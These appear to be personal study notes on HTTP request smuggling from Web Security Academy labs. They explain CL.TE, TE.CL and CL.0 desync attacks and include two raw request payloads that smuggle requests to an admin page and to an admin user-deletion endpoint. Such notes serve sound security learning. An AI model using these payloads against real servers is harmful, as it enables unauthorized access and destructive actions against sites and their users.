<h> CL.TE Desync Attack </h>
-> In this attack, frontend will interpret a web request using its content length header and the backend will interpret the same request using transfer encoded header.

<h> TE.CL Desync Attack </h>
-> In this attack, frontend will interpret a web request using  its chunked length header and the backend will interpret the same request using content length.

```
POST / HTTP/1.1
Host: 0a0d0091033ab07f81a6b10e000a007f.web-security-academy.net
Content-Length: 4
Transfer-Encoding: chunked
\r\n
13\r\n
GET /admin HTTP/1.1\r\n
0\r\n
\r\n


```
-> In HTTP/2 , if we use Transfer-Encoding: chunked header then it will response as `protocol error`

<p> CL.0 </p>
-> here frontend server accept content-length header but backend server does not support any header so, it interpret `\r\n\r\n` as end of the request, then the second request is smuggled.
```
POST /resources/images/blog.svg HTTP/2
Host: 0a5c00a7032aee9e838e198100e30004.web-security-academy.net
Cookie: session=DD74Q0cZjmasr1aIQi9wT1dfW75N96XR
Content-Length: 52\r\n
\r\n
GET /admin/delete?username=carlos HTTP/1.1
x-Host: 
```
